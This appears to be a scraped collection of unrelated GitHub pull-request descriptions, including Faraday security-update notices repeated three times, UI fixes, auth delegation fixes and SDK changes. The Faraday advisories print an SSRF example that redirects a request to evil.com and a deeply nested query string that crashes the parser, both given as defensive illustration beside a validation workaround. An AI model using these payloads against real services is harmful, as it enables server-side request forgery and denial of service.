🚨 Your current dependencies have known security vulnerabilities 🚨 This dependency update fixes known security vulnerabilities. Please see the details below and assess their impact carefully. We recommend to merge and deploy this as soon as possible!
Here is everything you need to know about this update. Please take a good look at what changed and the test results before merging this pull request. ### What changed? #### ↗️ faraday (_indirect_, 1.3.0 → 1.10.6) · [Repo](https://github.com/lostisland/faraday) · [Changelog](https://github.com/lostisland/faraday/blob/main/CHANGELOG.md)
Security Advisories 🚨

🚨 Faraday: Uncontrolled recursion in NestedParamsEncoder allows stack exhaustion DoS via deeply nested query parameters

Faraday::NestedParamsEncoder, the default nested query parameter encoder/decoder in Faraday, decodes nested query strings without enforcing a maximum nesting depth.

A crafted query string such as:

a[x][x][x][x]...[x]=1

causes Faraday to build a deeply nested Ruby Hash structure. The internal dehash routine then recursively walks this attacker-controlled structure without a depth limit. At sufficient depth, Ruby raises an uncaught SystemStackError (stack level too deep), crashing the calling thread or worker. This can lead to denial of service in applications that pass attacker-controlled query strings to Faraday's nested query parsing or URL-building paths.

This has been patched in version 2.14.3 and backported to 1.10.6.

🚨 Faraday affected by SSRF via protocol-relative URL host override in build_exclusive_url

Impact

Faraday's build_exclusive_url method (in lib/faraday/connection.rb) uses Ruby's
URI#merge to combine the connection's base URL with a user-supplied path. Per RFC 3986,
protocol-relative URLs (e.g. //evil.com/path) are treated as network-path references
that override the base URL's host/authority component.

This means that if any application passes user-controlled input to Faraday's get(),
post(), build_url(), or other request methods, an attacker can supply a
protocol-relative URL like //attacker.com/endpoint to redirect the request to an
arbitrary host, enabling Server-Side Request Forgery (SSRF).

The ./ prefix guard added in v2.9.2 (PR #1569) explicitly exempts URLs starting with
/, so protocol-relative URLs bypass it entirely.

Example:

conn = Faraday.new(url: 'https://api.internal.com')
conn.get('//evil.com/steal')
# Request is sent to https://evil.com/steal instead of api.internal.com

Patches

Faraday v2.14.1 is patched against this security issue. All versions of Faraday up to 2.14.0 are affected.

Workarounds

NOTE: Upgrading to Faraday v2.14.1+ is the recommended action to mitigate this issue, however should that not be an option please continue reading.

Applications should validate and sanitize any user-controlled input before passing it to
Faraday request methods. Specifically:

  • Reject or strip input that starts with // followed by a non-/ character
  • Use an allowlist of permitted path prefixes
  • Alternatively, prepend ./ to all user-supplied paths before passing them to Faraday

Example validation:

def safe_path(user_input)
  raise ArgumentError, "Invalid path" if user_input.match?(%r{\A//[^/]})
  user_input
end

body:
## The bug

On mobile, the tenant detail page scrolled sideways — content clipped on the left, dead space on the right (per the screenshot). Root cause: the header was a **non-wrapping `flex … justify-between`**, so the three action buttons (Send reminder / Lease agreement / Record payment) plus the contact info couldn't fit on a phone, the row overflowed, and that widened the whole page.

## The fix

- **Detail-page headers** (tenant + document) now **stack on mobile** (`flex-col gap-3 sm:flex-row sm:items-start sm:justify-between`) and the action-button group **wraps** (`flex-wrap`); the document filename can `break-words`. So on a phone the actions drop below the title instead of forcing horizontal scroll.
- **`DataTable`**: `overflow-x-auto` instead of `overflow-hidden`. A table wider than the viewport — e.g. the payments table's new **Receipt** column, or the **buildings units** table — now scrolls *within its card* on mobile instead of being clipped (you couldn't reach the rightmost columns before). No change on desktop where tables fit.

Scoped to the two detail headers with the clear overflow shape (back-link + long title + actions). List-page headers (single short title + one button) and card-internal label/badge rows were intentionally left alone — they don't overflow and shouldn't stack.

## Verification

- `npm run typecheck` / `npm run lint` — clean
- `npm test` — **600 pass** (className-only changes, no logic)
- **Not rendered here** (no mobile browser in this env): these are standard responsive Tailwind patterns targeting the diagnosed cause. Please re-check on your phone — the tenant page header should now wrap and the page shouldn't scroll sideways.

author: sushankthatipally
body:
Adds `mask_thinking_tokens`, a convenience function in the same spirit as
`train_on_responses_only`, that masks the thinking closing token (`</think>`
by default) to `-100` in the labels so it isn't trained on.

Requested in unslothai/unsloth#6695. Nemotron Ultra masks out `</think>`
during training so the model isn't trained on the reasoning terminator and
doesn't memorise a fixed reasoning length. This turns that into a one-liner,
composable after `train_on_responses_only`:

    trainer = train_on_responses_only(trainer, instruction_part=..., response_part=...)
    trainer = mask_thinking_tokens(trainer)

The function mirrors `train_on_responses_only`'s interface (`tokenizer`,
`return_function`, `num_proc`, `torch.Tensor`/list labels, `IterableDataset`)
and handles `</think>` whether it tokenises to one id or several. It's purely
subtractive: only positions matching `think_token` are set to `-100`; existing
`-100`s and every other label are left untouched. Tokenised datasets that don't
yet carry labels fall back to deriving them from `input_ids`.

Added offline CPU-only unit tests in `tests/test_mask_thinking_tokens.py`
covering single/multi-token `</think>`, multiple occurrences, label
preservation, tensor and list inputs, and the no-labels fallback.

Happy to follow up with a companion re-export from `unsloth.chat_templates`
(like `train_on_responses_only`) once this lands, and to rename the function
if you'd prefer something else.

author: veteze
body:
## Summary

Fixes the kernel half of #1146. Companion plugin fix: veteze/openclaw#... (see below).

`grants.ts` and `access.ts` were missed during the #1088 `actingFor` rollout. Both used the stale ownership-check pattern:

```ts
const requesterDid = authResult.identity.actingAs || authResult.identity.id;
```

This pattern handles group impersonation (`actingAs`) but ignores agent delegation (`actingFor`). When an agent DID sends `X-Acting-For: <owner>`, `requireAuth` correctly sets `identity.actingFor`, but these handlers fell back to the agent's own `id` — failing the `ownerDid` check with `403 Forbidden`.

`article.ts` had the same miss (found via audit grep — not in the original issue scope).

## Changes

All three files: import and call `resolveActingDid(identity)`, matching the 14 other media routes already migrated under #1088/#1116.

`resolveActingDid` precedence: `actingFor ?? actingAs ?? id`

- `apps/kernel/src/lib/media/routes/grants.ts`
- `apps/kernel/src/lib/media/routes/access.ts`
- `apps/kernel/src/lib/media/routes/article.ts` _(audit miss — same bug)_

## Acceptance

- Agent DID `PATCH /media/api/assets/{id}/grants` with `X-Acting-For: <owner>` and `{ add: ["<grantee-did>"] }` → 200, asset becomes `trust-graph`, grantee in `allowedDids`
- Agent DID `PATCH /media/api/assets/{id}/access` with `X-Acting-For: <owner>` and `{ access: "public" }` → 200
- Grantee can read the asset after grant

## Related

- Closes kernel side of #1146
- Plugin fix (payload `{ did }` → `{ add: [did] }`) in companion PR: veteze/openclaw `fix/1146-grant-media-access-payload` → imajin-jin/openclaw `feat/1080-agent-delegation`
- Audit note: `article.ts` fix included here as it has the identical pattern

## Description

Adds the foundation for native Apple apps (issue #29): a UniFFI binding layer over the Rust core plus a working SwiftUI proof-of-concept app that runs natively on iOS and macOS. This validates the 🔴 high-risk Rust→Swift bridge end-to-end before committing to the full multi-platform build-out.

**What's included**

- **`fond-ffi` crate** — a thin UniFFI boundary over `fond-core`/`fond-domain`/`fond-store`/`fond-timeline`. `FondClient` exposes read + cook-mode APIs (list, search, tags, recipe view, ingredient scaling, cooking timeline, reindex). Internal types are mapped to stable boundary DTOs so the ABI survives internal refactors. 13 integration tests cover the surface.

author: guneygaar
body:
## What

A new stateless Cloudflare Worker, `chat-transcribe`, that turns a recorded voice note into transcript text. It will back the upcoming voice-note feature. No database, no R2, no service role, no caching, no background work.

## Endpoint

- `POST` with the recorded audio bytes in the body (`audio/*` or `application/octet-stream`).
- Auth: requires a valid Supabase session JWT, verified exactly the way `chat-token` verifies its caller, by reusing asset-read's `getSupabaseJwks` + `verifyCaller` (ES256 JWKS). Unauthenticated callers get `401` before any audio is read; identity is taken only from the verified `sub`.
- Transcribes via Workers AI: `env.AI.run('@cf/openai/whisper-large-v3-turbo', { audio: <base64 of the body bytes> })` (multilingual; handles mixed Hindi/English).
- Responses: `200 { ok: true, transcript }` on success; `{ ok: false, code }` with `400` (empty body), `401` (auth), `405` (wrong verb), `500` (AI or unexpected fault). A non-string Whisper result throws rather than fabricating a transcript.

## Files

- `src/server/workers/chat-transcribe.ts` - the worker (trace id, logger, CORS, auth, response shapes mirror `chat-token`).
- `workers/chat-transcribe/wrangler.toml` - `name = "chat-transcribe"`, matching `compatibility_date` + `nodejs_compat`, the shared `[observability]` block, an `[ai]` binding `binding = "AI"`, and a comment listing the verification input (`SUPABASE_URL`; no shared secret, JWKS is asymmetric).
- `src/server/workers/chat-transcribe.test.ts` - mirrors `chat-token.test.ts`; mocks the JWKS and `env.AI.run`. Covers valid → `{ ok: true, transcript }`, missing/invalid auth → `401`, empty body → `400`, AI throw → `500`, wrong verb → `405`.

## Notes

- No new workflow file added: each worker has its own per-worker deploy workflow (no single enumerated list to append to), so per the task constraints no deploy workflow was created. The test runs in the existing vitest job.
- Stateless: nothing to open or close; the only outbound dependency is the `AI` binding.
- TypeScript strict, no `any`, no `@ts-ignore`; no npm dependency added.

author: vinix24
body:
## Summary

Intelligence build-step 4 (outcome-grounding). Collapses the **universal receipt-append confidence path** onto the `dispatch_pattern_offered` junction.

`intelligence_persist.update_confidence_from_outcome` runs on **every completion receipt** (via `append_receipt_internals/payload.py::_update_confidence_from_receipt`). It previously linked a dispatch to its patterns through a weak `source_dispatch_ids LIKE '%dispatch_id%'` substring join — prone to false positives, and capped at the last 20 ids per pattern. This wires it to the **precise per-dispatch `dispatch_pattern_offered` junction** (exact offered↔pattern linkage on the stable `intel_sp_<id>` convention), tenant-scoped on both sides, and records the grounding method on the `confidence_events` audit row so the self-learning auto-tier can tell precisely-grounded outcomes apart.

Same junction the subprocess-lane feedback loop already uses (`pattern_confidence._update_pattern_confidence`) — this brings the universal path to parity.

## Behaviour / safety

- **Opt-in, default OFF.** `VNX_OUTCOME_GROUNDING_V2=1` activates the junction join. Unset → **byte-identical** legacy `source_dispatch_ids` behaviour. Governance-critical path (touches confidence on every receipt), so the rollout is deliberate.
- **Junction authoritative when present** (flag ON); legacy join remains only as a compatibility shim for pre-junction DBs / flag-off. Junction and `source_dispatch_ids` are co-written in one transaction at injection, so "junction present" implies it is the complete, precise set.
- **Tenant-safe:** join filters `sp.project_id` **and** `dpo.project_id` when present (ADR-007); a cross-tenant id collision cannot leak a confidence update.
- **Fail-closed-not-crash** preserved (existing try/except + rollback). Idempotent within a call (junction PK + `SELECT DISTINCT`).
- Beta(success+1, failure+1) smoothing and `pattern_usage` linkage unchanged.

## Changes

- `scripts/lib/intelligence_persist.py` — `_resolve_grounded_patterns` (+ `_junction_grounded_rows`, `_legacy_source_id_rows`, `_has_table`, `_outcome_grounding_v2_enabled`); dynamic `confidence_events` insert that appends `grounding_source` when the column exists.
- `scripts/quality_db_init.py` — `_migrate_v24` (additive nullable `grounding_source TEXT`, existence-guarded, ALTER-only, idempotent); `HIGHEST_QI_VERSION` 23 → 24.
- `tests/test_outcome_grounding_v2.py` — 8 tests (junction grounds with empty `source_dispatch_ids`, flag-OFF legacy parity, junction-absent fallback, failure decay, non-pattern rows ignored, single-update DISTINCT, tenant isolation, absent-column grace).

## Verification

- New tests: 8 passed. Fresh-DB bootstrap reaches `user_version=24` with the new column, idempotent re-bootstrap.
- Regression green on `test_feedback_loop`, `test_success_patterns_multitenant`, `test_schema_idempotency`, `test_failure_decay_*`, `test_schema_versioning`, `test_migration_phase1_project_id`, `test_project_id_migration`, `test_payload_exception_handling`, `test_intelligence_recency`.
- kimi-diff-gate: **PASS** (0 blocking).
- 3 unrelated pre-existing failures confirmed on `origin/main` with this diff stashed (env/live-DB dependent).

body:
🚨 Your current dependencies have known security vulnerabilities 🚨 This dependency update fixes known security vulnerabilities. Please see the details below and assess their impact carefully. We recommend to merge and deploy this as soon as possible!
Here is everything you need to know about this update. Please take a good look at what changed and the test results before merging this pull request. ### What changed? #### ↗️ faraday (_indirect_, 1.5.0 → 1.10.6) · [Repo](https://github.com/lostisland/faraday) · [Changelog](https://github.com/lostisland/faraday/blob/main/CHANGELOG.md)
Security Advisories 🚨

🚨 Faraday: Uncontrolled recursion in NestedParamsEncoder allows stack exhaustion DoS via deeply nested query parameters

Faraday::NestedParamsEncoder, the default nested query parameter encoder/decoder in Faraday, decodes nested query strings without enforcing a maximum nesting depth.

A crafted query string such as:

a[x][x][x][x]...[x]=1

causes Faraday to build a deeply nested Ruby Hash structure. The internal dehash routine then recursively walks this attacker-controlled structure without a depth limit. At sufficient depth, Ruby raises an uncaught SystemStackError (stack level too deep), crashing the calling thread or worker. This can lead to denial of service in applications that pass attacker-controlled query strings to Faraday's nested query parsing or URL-building paths.

This has been patched in version 2.14.3 and backported to 1.10.6.

🚨 Faraday affected by SSRF via protocol-relative URL host override in build_exclusive_url

Impact

Faraday's build_exclusive_url method (in lib/faraday/connection.rb) uses Ruby's
URI#merge to combine the connection's base URL with a user-supplied path. Per RFC 3986,
protocol-relative URLs (e.g. //evil.com/path) are treated as network-path references
that override the base URL's host/authority component.

This means that if any application passes user-controlled input to Faraday's get(),
post(), build_url(), or other request methods, an attacker can supply a
protocol-relative URL like //attacker.com/endpoint to redirect the request to an
arbitrary host, enabling Server-Side Request Forgery (SSRF).

The ./ prefix guard added in v2.9.2 (PR #1569) explicitly exempts URLs starting with
/, so protocol-relative URLs bypass it entirely.

Example:

conn = Faraday.new(url: 'https://api.internal.com')
conn.get('//evil.com/steal')
# Request is sent to https://evil.com/steal instead of api.internal.com

Patches

Faraday v2.14.1 is patched against this security issue. All versions of Faraday up to 2.14.0 are affected.

Workarounds

NOTE: Upgrading to Faraday v2.14.1+ is the recommended action to mitigate this issue, however should that not be an option please continue reading.

Applications should validate and sanitize any user-controlled input before passing it to
Faraday request methods. Specifically:

  • Reject or strip input that starts with // followed by a non-/ character
  • Use an allowlist of permitted path prefixes
  • Alternatively, prepend ./ to all user-supplied paths before passing them to Faraday

Example validation:

def safe_path(user_input)
  raise ArgumentError, "Invalid path" if user_input.match?(%r{\A//[^/]})
  user_input
end

# What does this Pull Request do?

Upgrades `mirador-analytics-plugin` from Mirador 3 to **Mirador 4** (released as `2.0.0`). This is a breaking change and is **not** backwards compatible with Mirador 3.

Key changes:

- **Plugin rewrite** (`src/plugins/MiradorAnalytics.js`): converts the class component to a function component using `useEffect` for the Google Tag Manager snippet injection, returns `null` instead of `""`, and adds a `name` (`MiradorAnalyticsPlugin`) to the plugin export per Mirador 4 conventions.
- **Dependencies** (`package.json`): bumps to React 19/`react-dom` 19, `mirador` ^4.1.0, MUI 7 (`@mui/material`, `@mui/system`), Emotion, `react-i18next`, and `redux` 5; updates `@testing-library/react` to ^16; bumps version to `2.0.0`.
- **Build/config**: marks React/ReactDOM/Mirador/MUI/Emotion/etc. as `external` in `rollup.config.mjs`; migrates Vite/Vitest configs from the esbuild `jsx` loader to `rolldownOptions.moduleTypes`; updates the demo entry to import from `mirador` directly; `.nvmrc` moves to `lts/jod`.
- **Tests & CI**: adds unit tests for `mapStateToProps` and the GTM snippet injection (`__tests__/MiradorAnalytics.test.jsx`), a `scripts/coverage-ci.mjs` Vitest wrapper for the LTS reusable coverage workflow, and a `coverage-node.yml` GitHub Actions workflow with README coverage badges.

author: artyhoo
body:
S1 of umbrella `enforcement-liveness-fix` (U2) — **research only, fixes nothing** (single research-patch doc).

Reproduced and isolated the exact cause of the `.ts`-rule liveness gap, with command+output evidence (Node 22.22.3, ESLint 9.39.4). Root cause: the shipped `eslint.config.mjs` imports the rule barrel as `./eslint-rules-local/index.ts`, so barrel load depends on a TS loader at eslint-run time; the **raw** eslint channels (pre-commit/lint-staged + manual `npx eslint`) carry no loader -> `ERR_UNKNOWN_FILE_EXTENSION ".ts"` on Node **without** default type-stripping.

**Park trigger surfaced for maintainer (premise inversion):** on the umbrella's specified env (current Node 22 >= 22.18, type-stripping on by default) the raw path loads the barrel and blocks the violation; the crash reproduces on Node **20.x** (the consumer's own .nvmrc) and Node 22.0-22.17 — the opposite version polarity to the kickoff premise. Also f17 uses tsx (never the raw path) -> already green on both Node 20 and 22, so S5's gate as written is mis-targeted. Variant A fix direction still stands; blocker framing + S5 gate target need a maintainer call. Both options enumerated in the doc (reviewer-discipline §2, no pick).

Dispatched autonomously via aif-handoff; egressed via gh Git Data API (container has no git transport).

Phase 8 / **PR 8G-1** (plan `0012`, Test Runs). **Frontend-only, no backend, no deploy** — `RunsExplorer.tsx` is **live-rows**-backed (`/api/telemetry/runs` → `tel_test_runs`); the row grain carries no run links, so CSV satisfies the minimum. Reuses the 8A `MetricInspectorDrawer` + `ExportToCsvButton`. `RunsExplorer.tsx` only. *(8G split: this is Test Runs; Run Autopsy / Review = 8G-2 if warranted.)*

## Inventory (route-first)
| Surface | Route | Nav | Source kind | Run links on grain |
|---|---|---|---|---|
| **RunsExplorer** (this PR) | `/telemetry/runs` | **visible** | **live-rows** (`tel_test_runs`) | **none** — `{id, run_key, dataset, unit_or_channel, spacecraft, row_count, ingest_at, status, created_at}`; no mlflow/Databricks/artifact/evidence fields |
| RunAutopsy | `/telemetry/data-engineering/autopsy` | hidden-but-resolving | data-engineering receipts (not test runs) | out of demo scope — **not revived** |
| ReplayForensicsDrawer | embedded (replay) | n/a | computed-artifact/fixture; already has lineage + workspace links + honest nulls | separate surface — **untouched** (candidate 8G-2) |

## Source-kind treatment
A **"live rows · tel_test_runs"** chip + run count + CSV button in the panel header.

## Drill-through behavior + fields
Every run row (desktop **and** mobile) is clickable → `MetricInspectorDrawer` exposing the **present** fields (run id, run key, dataset, unit/channel, spacecraft, row count, status, ingested-at, created-at) and **fail-closing the absent** ones — **run-type/model-kind**, **MLflow/Databricks run**, **model/evidence artifact** — with an explicit `null_reason` (`tel_test_runs` is the ingested window, not a training/scoring run).

## Run/artifact links + unavailable behavior
**None invented** — the grain has no run identifiers. The **run_key is the copyable id**; the absent link fields render fail-closed "Not available" + null_reason. Honors "id without a resolvable URL → copyable id + unavailable, never a fabricated URL."

## Export behavior
**CSV** of the displayed runs (the exact ingest fields), **disabled-with-reason** when none ingested. No server XLSX (operational ingest rows; CSV is the honest minimum — no backend/deploy).

## Evidence preserved
Existing `tel_test_runs` provenance note kept. **No ML value changed; frozen-evidence 8/8.** No schema/backend/notebook/evidence-JSON change. **Nav unchanged** — no hidden Data Engineering page resurrected.

## Tests / results
- New `RunsExplorer.test.tsx` (source-kind + CSV; fail-closed record drill with no fabricated URL; empty → CSV disabled). Full telemetry suite **227 passed**; typecheck + lint clean.

## Deploy
**None required** — frontend-only.

## Scope
Only `RunsExplorer.tsx` (+ test). No Overview/Mission Control/Model/RUL/Factory/Flight/nav/schema/notebook/evidence-JSON touched. Rebased on main (no concurrent conflict).

🚨 Faraday: Uncontrolled recursion in NestedParamsEncoder allows stack exhaustion DoS via deeply nested query parameters

Faraday::NestedParamsEncoder, the default nested query parameter encoder/decoder in Faraday, decodes nested query strings without enforcing a maximum nesting depth.

A crafted query string such as:

a[x][x][x][x]...[x]=1

causes Faraday to build a deeply nested Ruby Hash structure. The internal dehash routine then recursively walks this attacker-controlled structure without a depth limit. At sufficient depth, Ruby raises an uncaught SystemStackError (stack level too deep), crashing the calling thread or worker. This can lead to denial of service in applications that pass attacker-controlled query strings to Faraday's nested query parsing or URL-building paths.

This has been patched in version 2.14.3 and backported to 1.10.6.

🚨 Faraday affected by SSRF via protocol-relative URL host override in build_exclusive_url

Impact

Faraday's build_exclusive_url method (in lib/faraday/connection.rb) uses Ruby's
URI#merge to combine the connection's base URL with a user-supplied path. Per RFC 3986,
protocol-relative URLs (e.g. //evil.com/path) are treated as network-path references
that override the base URL's host/authority component.

This means that if any application passes user-controlled input to Faraday's get(),
post(), build_url(), or other request methods, an attacker can supply a
protocol-relative URL like //attacker.com/endpoint to redirect the request to an
arbitrary host, enabling Server-Side Request Forgery (SSRF).

The ./ prefix guard added in v2.9.2 (PR #1569) explicitly exempts URLs starting with
/, so protocol-relative URLs bypass it entirely.

Example:

conn = Faraday.new(url: 'https://api.internal.com')
conn.get('//evil.com/steal')
# Request is sent to https://evil.com/steal instead of api.internal.com

Patches

Faraday v2.14.1 is patched against this security issue. All versions of Faraday up to 2.14.0 are affected.

Workarounds

NOTE: Upgrading to Faraday v2.14.1+ is the recommended action to mitigate this issue, however should that not be an option please continue reading.

Applications should validate and sanitize any user-controlled input before passing it to
Faraday request methods. Specifically:

  • Reject or strip input that starts with // followed by a non-/ character
  • Use an allowlist of permitted path prefixes
  • Alternatively, prepend ./ to all user-supplied paths before passing them to Faraday

Example validation:

def safe_path(user_input)
  raise ArgumentError, "Invalid path" if user_input.match?(%r{\A//[^/]})
  user_input
end

author: lucasheriques
body:
## Problem

The standalone `posthog-cli api` exec path emitted tool calls only under the legacy `mcp_tool_call` event, never the canonical `$mcp_tool_call`. So `posthog_cli`-sourced tool calls were invisible to any insight built on `$mcp_tool_call` — the event we're migrating everything onto. The hosted hono server already dual-emits both; the CLI was the one producer left behind.

## Changes

- `cli/index.ts`: the exec tool-call tracker now emits the canonical `$mcp_tool_call` alongside the legacy `mcp_tool_call`, from one shared props object. This mirrors the hono server's dual-emit so the CLI joins the same analytics vocabulary.
- `lib/posthog/analytics.ts`: added `MCP_TOOL_CALL_CANONICAL = '$mcp_tool_call'` to the `AnalyticsEvent` enum so the canonical emit stays type-safe.

The legacy emit is kept as a transition shim (commented as such) so cross-source insights still keyed on `mcp_tool_call` don't lose CLI volume mid-migration. It comes out together with the hono shim once insights are repointed to `$mcp_tool_call`.

## How did you test this code?

I'm an agent. I ran the automated checks only, in the main checkout against the identical change (the worktree differs only in comment text):

- `pnpm typecheck` — clean
- `pnpm test cli-context exec.test` — 2 files, 73 tests passing

No manual testing. Post-deploy, the `posthog_cli` source should show `$mcp_tool_call` at parity with its `mcp_tool_call` count.

## 🤖 Agent context

**Autonomy:** Human-driven (agent-assisted)

Investigation started from a discrepancy between `mcp_tool_call` and `$mcp_tool_call` counts in project 2. Tracing it: the canonical event began on Jun 15 (the `@posthog/mcp@0.2.0` migration), and a separate inner-`exec` emission gap was already fixed in #66144. The remaining legacy-only producer was the `posthog-cli` exec path — the subject of this PR. Chosen approach is dual-emit (not a straight switch to canonical-only) to match the hono server's transition strategy and avoid dropping CLI volume from legacy-keyed insights before they migrate.

No repo skills were required for this change.

body:
## Что и зачем

Направление **B** из roadmap (cross-repo lecture-ui). Расследование показало, что код-сторона уже доставлена (#209 рендер абзацев без `t`, #210 add-block), и **dialog-разметка не нужна**: шаблон рендерит только `speech`/`figure` (makejson2), а dialog (makejson.py) в собранную форму не попадает — в [`template.html.j2`](https://github.com/gasyoun/Systema-Sanscriticum/blob/main/lecture-ui/templates/template.html.j2) нет dialog-ветки.

Поэтому реальный остаток B — **зафиксировать кросс-репо контракт тестом**, чтобы он не сломался молча.

### Контракт
`LecturePatcher` (`move_block` / `delete_block` / `insert_block`, PR #186/#210) адресует блоки по **`data-block-index` = позиции в `section.content`**. Если шаблон перестанет проставлять индекс (или собьёт `loop.index0`), структурное редактирование промахнётся мимо блока — без видимой ошибки.

### Тест
Секция `speech / figure / speech` → ожидаем `data-block-index` 0/1/2 с верным `data-block-type`, ровно по одному индексу на блок. Покрывает оба типа блоков (speech И figure).

`cd lecture-ui && python -m pytest tests/` → **3 passed** (2 прежних #209-теста + 1 новый).

## Сознательный non-goal
Визуальный pre-apply AI-diff (apply=false) — отдельная крупная фича, требует diff-payload от Python-сервиса. «Reject» правок ИИ уже покрыт откатом к бэкапу (#189), поэтому диф — улучшение UX, а не пробел; не делаю спекулятивно.

author: csm
body:
macroexpand_all leaves #(...) as an AnonFn node for the tree-walking interpreter to expand at eval time, but the AOT lowerer has no such fallback and rejects an un-expanded AnonFn. This was latent for the entry namespace (no AOT test exercised #()) and became reachable once required namespaces are compiled rather than interpreted as bundled source — e.g. clojure.tools.cli, whose source uses #(...).

Add a recursive expand_anon_fns pass that rewrites #(...) to (fn* ...) before lowering, applied to the compilable forms of both the entry and each required namespace. Add AOT e2e regression tests covering #() in the entry and in a required namespace.

author: matheusfpimentel-wq
body:
Fatia C da reforma de alertas — os **eixos de entrega** (a filosofia *severidade ≠ canal ≠ permanência*).

## Push segue a severidade
Antes o push era só "crítico". Agora segue a severidade:
- 🔴 **Crítico** e 🟡 **Atenção** → avisam (push).
- ⚪ **Informativo** → não pucha.

(O push **por regra** sobreponível — ligar um informativo específico, ex.: aniversário — vem numa fatia futura, com o construtor.)

## Modo pausa
Toggle global que **suspende os alertas de pipeline/continuidade** (gigs à frente, funil de produção, conteúdo/ideias parados, relacionamento) durante uma pausa deliberada — sem te cobrar por isso. **Dinheiro e prazo nunca são pausados** (cachê, tarefa vencida, GIG sem prep, debrief, aulas, aluno).

- `computeAlerts` ganha o parâmetro `paused`; `isPausableKey` marca as regras de continuidade.
- Estado em `ruleConfig` (viaja no `.vistage`, leitura síncrona como os ids desligados).
- Toggle em **dois lugares**: cabeçalho da central de Alertas e **Configurações avançadas → Alertas**.

Aditivo (sem migração). Typecheck + build limpos.

### Faltam
**D** agregações (SUM/COUNT/RATIO + limiar) e regras multi-entidade no construtor · permanência (persistente/dispensável) refinada + time-box · **E** alertas `[depende: festas/financeiro]`.

body:
## Summary

Fixes the plugin half of #1146 (imajin-ai). Companion kernel fix: ima-jin/imajin-ai#...

`grantMediaAccess` sent `{ did }` as the PATCH body, but the kernel route (`patchGrants`) expects `{ add: string[], remove?: string[] }`. The old shape was silently dropped by the route's array guard, returning `400 "add or remove must contain at least one DID string"`.

## Changes

**`extensions/imajin/src/client.ts`**

- `grantMediaAccess`: body `{ did }` → `{ add: [did] }`
- Add `revokeMediaAccess(assetId, did, onBehalfOf?)` with `{ remove: [did] }` — there was no way to remove a grant from this client at all

Both methods already thread `onBehalfOf` through `authHeaders` (→ `X-Acting-For`), so once the kernel fix lands delegated mutations work end-to-end.

## Acceptance

- `grantMediaAccess(assetId, did)` → kernel returns 200, grantee appears in `allowedDids`, asset access flips to `trust-graph`
- `revokeMediaAccess(assetId, did)` → kernel returns 200, grantee removed from `allowedDids`
- Both work with `onBehalfOf` (agent delegation) once companion kernel PR merges

author: shpala
body:
## Summary

Deep links to **/matches/[id]**, **/teams/[id]**, and **/bracket** now unfurl with a custom Open Graph preview instead of the single root image — addresses the "shareable / rich OG images" gap from the UX review. **OG images only** (no visible share button, per the chosen scope).

Each handler follows the existing root `app/opengraph-image.tsx` pattern:
- **ISR** (`revalidate=3600`, not force-dynamic) so link crawlers (WhatsApp, Slack, X) get a cached image instantly
- `nodejs` runtime, 1200×630, local base64 brand mark (no remote fetches)
- `try/catch` → generic fallback, so a bad/missing id renders a generic card, **never a 500**
- shared Satori-safe frame in `lib/ogCard.tsx`

**Content:** match = the tie + real score ("Full-time") when played, else the model's rating-based prediction · team = title odds + strength rank · bracket = the model's predicted champion + next contenders.

**Provenance guard (from the adversarial review):** in sample mode (live spine down → bundled snapshot with RNG scores/odds) the cards do **not** broadcast a fabricated result/pick — the match falls through to the rating-based prediction, and the bracket/team fall through to a generic card. This mirrors the root OG's "never broadcast an invented pick" rule; the link preview has no SampleDataBanner, so it's the worst place to leak one.

## Test plan

- `npm run lint` 0 errors · `npm test` **217/217** · `npm run build` clean (all three OG routes registered)
- Every endpoint returns **200 `image/png` (~48–55 KB)**, incl. a bad id → graceful generic PNG (not a 500)
- `og:image` **and** `twitter:image` (+ `image:alt` from the `alt` export, 1200×630) wired into each page head
- Images render on-brand with no overflow — verified visually (real score, scheduled-match prediction with a wrapped two-name headline, predicted champion, team odds + rank)
- Root OG unchanged (no regression)
- Note: local serves real data, so the sample-mode guard can't be reproduced here; verified by code review (mirrors the proven root pattern) + confirming every fall-through body it routes to renders.

## Review

Adversarial diff review (4 lenses: Satori render / ISR-crawler / data-honesty / metadata) raised 3, all confirmed — the missing `usingSample` provenance guard on all three cards — **fixed** before this PR and re-verified.

author: kris098e
body:
## What Changed

Replace the hand-rolled System.Text.Json PATCH body with a generated tri-state model, produced by a `regen.sh` post-process + a Newtonsoft resolver, and pin wire parity against the shared contract.

- **Regen post-process** (`regen.sh`): rewrites every nullable `string` property (and its constructor parameter) on the generated `UpdateUserRequest` to `Patch<string>`. Generic within the model — a new nullable-string field is converted automatically, **zero hand edits**. (The csharp generator can't express tri-state and STJ can't omit a property from a value-converter, hence the post-process + Newtonsoft.)
- **`PatchSerialization`**: a Newtonsoft contract resolver + converter. A field left `null` / `Patch.Omit` is omitted (leave unchanged), `Patch.Set(v)` sets, `Patch.Set(null)` emits an explicit JSON null (clear); null values *inside* a metadata bag are preserved (key delete). `Patch<T>` gains `IPatch` so the resolver/converter work without the element type.
- **`UpdateAsync` takes the generated `UpdateUserRequest`** and serializes it with those settings (raw PATCH). The hand-rolled `UpdateUserInput` + STJ `ToJsonBody` are deleted.
- **Add `PatchWireParityTests`** — round-trips each `UpdateUserRequest` fixture from the shared contract (`contract-tests/fixtures/patch-wire`) through the model + settings and asserts identical bytes, matching the server round-trip test and every other SDK.

Verified: `dotnet test` green — 19 tests incl. 6 parity fixtures (omit / clear / set + metadata key-delete) and the existing auth suite.

**Breaking (0.x):** `UpdateAsync` now takes the generated `UpdateUserRequest` (build it with `Patch<string>.Set(...)`) instead of the removed `UpdateUserInput`. Part of the coordinated cross-SDK tri-state parity release (v0.0.7).

body:
💡 What: Replaced the indexed `range(n)` loop in `_cosine` with `zip(a, b)` and combined `math.sqrt(norm_a) * math.sqrt(norm_b)` into a single `math.sqrt(norm_a * norm_b)` call after the loop.
🎯 Why: `BINARY_SUBSCR` (list indexing) adds significant overhead in Python loops. Using `zip` operates at C-speed in the interpreter for iterating multiple iterables. Reducing the number of `math.sqrt` calls per cosine similarity calculation also reduces function call overhead.
📊 Impact: Expected performance improvement of ~25-30% faster execution for cosine similarity calculations (benchmark tests show a drop from 2.99s to 2.13s for 10000 iterations of 1536-dim vectors).
🔬 Measurement: Run a benchmark script comparing the original and new `_cosine` function with randomized large arrays. Ensure standard functionality via `assert SemanticMemoryStore._cosine([1.0, 0.0], [1.0, 0.0]) == 1.0`.

author: dl-alexandre
body:
## Problem

The `gate` check failed deterministically on `DevIDE.Terminals.SessionDirectoryTest` "switching to a worktree shell uses that worktree as the active cwd":

```
** (MatchError) {"...fatal: '/tmp/devide-session-directory-42370-agent-worktree-switch' already exists\n", 128}
